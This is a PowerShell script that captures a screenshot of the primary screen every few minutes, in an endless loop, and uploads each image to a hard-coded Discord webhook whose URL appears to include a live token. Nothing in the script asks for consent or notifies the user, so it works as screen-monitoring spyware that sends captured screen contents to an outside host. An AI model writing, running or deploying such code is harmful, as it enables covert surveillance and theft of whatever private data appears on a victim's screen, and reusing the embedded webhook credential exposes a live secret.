<#
.SYNOPSIS
    Captures screenshots and sends them to a Discord webhook using multipart/form-data.
#>

param (
    [int]$IntervalMinutes = 5,
    [string]$WebhookUrl = "https://discord.com/api/webhooks/1448080213845217293/5Rjf-sQfcxxSq94k37-ijS7Pj3F1vr7l3SzLrWtRljJbyYYQvhZFBViBHQuqF_2kwlru",
    [string]$OutputFolder = "C:\Temp\Screenshots"
)

# Create output folder if it doesn't exist
if (-not (Test-Path -Path $OutputFolder)) {
    New-Item -ItemType Directory -Path $OutputFolder | Out-Null -ErrorAction SilentlyContinue
}

# Function to capture screenshot
function Capture-Screenshot {
    param (
        [string]$OutputPath
    )

    try {
        Add-Type -AssemblyName System.Windows.Forms
        Add-Type -AssemblyName System.Drawing

        $screenBounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
        $bitmap = New-Object System.Drawing.Bitmap($screenBounds.Width, $screenBounds.Height)
        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
        $graphics.CopyFromScreen($screenBounds.Location, [System.Drawing.Point]::Empty, $screenBounds.Size)
        $graphics.Dispose()

        $bitmap.Save($OutputPath, [System.Drawing.Imaging.ImageFormat]::Png)
        Write-Host "Screenshot saved to $OutputPath"
        return $OutputPath
    }
    catch {
        Write-Error "Failed to capture screenshot: $_"
        return $null
    }
}

# Function to send the multipart/form-data request to Discord webhook
function Send-DiscordWebhook {
    param (
        [string]$ImagePath
    )

    try {
        $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
        $fileName = "screenshot.png"

        # Create a new HttpClient instance
        $httpClient = New-Object System.Net.Http.HttpClient

        # Create a multipart/form-data content
        $content = New-Object System.Net.Http.MultipartFormDataContent

        # Create JSON payload
        $payload = @{
            embeds = @(
                @{
                    title = "New Screenshot"
                    description = "Automated screenshot capture at $timestamp"
                    image = @{
                        url = "attachment://$fileName"
                    }
                }
            )
        } | ConvertTo-Json

        # Add JSON payload to the content
        $jsonContent = New-Object System.Net.Http.StringContent($payload, [System.Text.Encoding]::UTF8, "application/json")
        $content.Add($jsonContent, "payload_json")

        # Open the file stream
        $fileStream = [System.IO.File]::OpenRead($ImagePath)

        # Create a stream content for the file
        $fileContent = New-Object System.Net.Http.StreamContent($fileStream)

        # Add the file to the content with the correct content type and filename
        $fileContent.Headers.ContentType = [System.Net.MediaTypeName]::new("image/png")
        $content.Add($fileContent, "file", $fileName)

        # Send the request
        $response = $httpClient.PostAsync($WebhookUrl, $content).Result

        # Ensure the request was successful
        if ($response.IsSuccessStatusCode) {
            Write-Host "Screenshot sent to Discord webhook successfully."
        } else {
            Write-Error "Failed to send screenshot to Discord webhook. Status code: $($response.StatusCode)"
            Write-Error "Response content: $($response.Content.ReadAsStringAsync().Result)"
        }
    }
    catch {
        Write-Error "An error occurred while sending the screenshot: $_"
        Write-Error "Response: $($_.Exception.Response)"
    }
}

# Main loop
Write-Host "Starting screenshot capture loop..."
while ($true) {
    $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
    $filename = "$OutputFolder\Screenshot_$timestamp.png"

    # Capture screenshot
    $capturedFile = Capture-Screenshot -OutputPath $filename
    if (-not $capturedFile) {
        Write-Warning "Failed to capture screenshot. Retrying in $IntervalMinutes minutes..."
        Start-Sleep -Seconds ($IntervalMinutes * 60)
        continue
    }

    # Send to Discord webhook
    Send-DiscordWebhook -ImagePath $capturedFile

    # Wait for next interval
    Write-Host "Waiting $IntervalMinutes minutes before next capture..."
    Start-Sleep -Seconds ($IntervalMinutes * 60)
}